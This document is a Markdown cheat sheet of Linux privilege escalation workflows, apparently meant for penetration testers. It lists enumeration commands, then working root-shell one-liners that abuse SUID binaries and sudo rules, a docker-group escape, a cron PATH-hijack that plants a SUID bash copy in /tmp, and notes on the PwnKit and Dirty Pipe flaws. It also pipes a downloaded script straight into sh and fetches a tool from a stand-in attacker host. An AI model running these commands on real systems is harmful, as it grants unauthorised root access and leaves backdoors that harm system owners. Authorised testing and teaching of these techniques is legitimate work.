# Linux Privilege Escalation Workflows

## Workflow 1: Manual Enumeration

### System Information
```bash
# OS and kernel version
uname -a
cat /etc/os-release
cat /proc/version

# Check for writable paths
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# Network info
ip a
ss -tlnp
netstat -tulpn
```

### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Cross-reference with GTFOBins
# https://gtfobins.github.io/
```

### Sudo Configuration
```bash
sudo -l
# Check for:
# - (ALL) NOPASSWD: /usr/bin/vim
# - (ALL) NOPASSWD: /usr/bin/find
# - (ALL) NOPASSWD: /usr/bin/python3
# - Wildcard entries: /usr/bin/rsync *
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Monitor processes for hidden cron
# Use pspy to see processes running as root
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# Interesting capabilities:
# cap_setuid - python3, perl, ruby
# cap_dac_override - any binary
# cap_net_raw - tcpdump
```

## Workflow 2: Automated Enumeration

### LinPEAS
```bash
# Download and run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
wget http://attacker/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt
```

### Linux Exploit Suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## Workflow 3: Common Exploitation

### SUID Binary Exploitation (GTFOBins)
```bash
# /usr/bin/find with SUID
find . -exec /bin/sh -p \; -quit

# /usr/bin/python3 with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# /usr/bin/vim with SUID
vim -c ':!sh'

# /usr/bin/nmap with SUID (old versions)
nmap --interactive
!sh
```

### Sudo Abuse Examples
```bash
# sudo vim
sudo vim -c ':!sh'

# sudo find
sudo find / -exec /bin/sh \; -quit

# sudo python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# sudo env with LD_PRELOAD
# If env_keep+=LD_PRELOAD is set:
# Compile shared object that spawns shell
# sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/any_allowed_command
```

### PwnKit (CVE-2021-4034)
```bash
# Check if vulnerable
pkexec --version
# Vulnerable: polkit < 0.120

# Multiple public exploits available
# Usage: compile and run - instant root
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Check kernel version
uname -r
# Vulnerable: 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102

# Exploit overwrites read-only files via pipe splice
```

## Workflow 4: Advanced Techniques

### Docker Escape (if user is in docker group)
```bash
# Check group membership
id
# If in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### NFS Root Squashing Bypass
```bash
# Check NFS exports
showmount -e target
cat /etc/exports
# If no_root_squash is set:
# Mount share, create SUID binary, execute on target
```

### PATH Hijacking in Cron
```bash
# If cron job uses relative paths:
# Create malicious binary in writable PATH directory
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/command_name
chmod +x /tmp/command_name
# Wait for cron to execute, then:
/tmp/rootbash -p
```
